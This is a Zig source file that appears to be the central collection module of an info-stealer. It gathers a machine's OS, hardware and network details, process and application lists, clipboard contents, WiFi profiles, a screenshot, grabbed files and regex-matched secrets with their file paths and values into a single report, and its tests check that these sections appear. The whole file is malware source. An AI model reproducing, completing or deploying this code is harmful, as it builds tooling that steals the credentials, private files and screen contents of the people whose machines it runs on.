const std = @import("std");
const os_info = @import("os_info.zig");
const hardware = @import("hardware.zig");
const network_info = @import("network_info.zig");
const wifi = @import("wifi.zig");
const screenshot = @import("screenshot.zig");
const grabber = @import("grabber.zig");
const processes = @import("processes.zig");
const applications = @import("applications.zig");
const clipboard = @import("clipboard.zig");
const launch_info = @import("launch_info.zig");
const regex_grabber = @import("regex_grabber.zig");

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    var report = std.ArrayList(u8).init(allocator);
    errdefer report.deinit();
    const w = report.writer();

    try w.print("=== Launch Info ===\n", .{});
    if (launch_info.collect(allocator)) |li| {
        defer allocator.free(li.exe_path);
        try w.print("Path: {s}\nOn Disk: {}\n\n", .{ li.exe_path, li.is_disk });
    } else |e| {
        try w.print("Failed: {}\n\n", .{e});
    }

    try w.print("=== OS Information ===\n", .{});
    {
        const os = os_info.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect OS info: {}\n", .{e});
        };
        defer allocator.free(os);
        try w.print("{s}\n\n", .{os});
    }

    try w.print("=== Hardware ===\n", .{});
    {
        const hw = hardware.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect hardware info: {}\n", .{e});
        };
        defer allocator.free(hw);
        try w.print("{s}\n\n", .{hw});
    }

    try w.print("=== Network ===\n", .{});
    {
        const net = network_info.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect network info: {}\n", .{e});
        };
        defer allocator.free(net);
        try w.print("{s}\n\n", .{net});
    }

    try w.print("=== Processes ===\n", .{});
    if (processes.collect(allocator)) |list| {
        defer {
            for (list) |entry| allocator.free(entry.name);
            allocator.free(list);
        }
        for (list) |entry| {
            try w.print("  {} - {s}\n", .{ entry.pid, entry.name });
        }
        try w.print("\n", .{});
    } else |e| {
        try w.print("Failed: {}\n\n", .{e});
    }

    try w.print("=== Applications ===\n", .{});
    if (applications.collect(allocator)) |list| {
        defer {
            for (list) |app| {
                allocator.free(app.name);
                allocator.free(app.version);
            }
            allocator.free(list);
        }
        for (list) |app| {
            if (app.version.len > 0) {
                try w.print("  {s} ({s})\n", .{ app.name, app.version });
            } else {
                try w.print("  {s}\n", .{app.name});
            }
        }
        try w.print("\n", .{});
    } else |e| {
        try w.print("Failed: {}\n\n", .{e});
    }

    try w.print("=== Clipboard ===\n", .{});
    {
        const text = clipboard.capture(allocator);
        if (text) |t| {
            defer allocator.free(t);
            if (t.len > 0) {
                try w.print("{s}\n\n", .{t});
            } else {
                try w.print("[empty]\n\n", .{});
            }
        } else {
            try w.print("[unavailable]\n\n", .{});
        }
    }

    try w.print("=== WiFi Profiles ===\n", .{});
    {
        const wf = wifi.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to collect WiFi: {}\n", .{e});
        };
        defer allocator.free(wf);
        try w.print("{s}\n\n", .{wf});
    }

    try w.print("=== Screenshot ===\n", .{});
    {
        const ss = screenshot.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to capture screenshot: {}\n", .{e});
        };
        defer allocator.free(ss);
        try w.print("[Screenshot captured: {} bytes]\n\n", .{ss.len});
    }

    try w.print("=== File Grabber Results ===\n", .{});
    {
        const gr = grabber.collect(allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to grab files: {}\n", .{e});
        };
        defer allocator.free(gr);
        try w.print("{s}\n", .{gr});
    }

    try w.print("=== Regex Grabber Results ===\n", .{});
    {
        const rg = regex_grabber.scanFiles(grabber.DEFAULT_RULES, allocator) catch |e| blk: {
            break :blk try std.fmt.allocPrint(allocator, "Failed to scan for secrets: {}\n", .{e});
        };
        defer allocator.free(rg);
        if (rg.len > 0) {
            for (rg) |s| {
                try w.print("[{s}] {s}: {s}\n", .{ s.secret_type, s.file_path, s.value });
            }
        } else {
            try w.print("No secrets found\n", .{});
        }
    }

    return try report.toOwnedSlice();
}

const testing = std.testing;

test "collect returns complete report" {
    const report = try collect(testing.allocator);
    defer testing.allocator.free(report);
    try testing.expect(report.len > 0);
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "OS Information"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Hardware"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Network"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "WiFi"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "Screenshot"));
    try testing.expect(std.mem.containsAtLeast(u8, report, 1, "File Grabber"));
}

test "section_header style is correct" {
    var buf = std.ArrayList(u8).init(testing.allocator);
    defer buf.deinit();
    const w = buf.writer();
    try w.print("=== {s} ===\n", .{"Test"});
    try testing.expectEqualStrings("=== Test ===\n", buf.items);
}
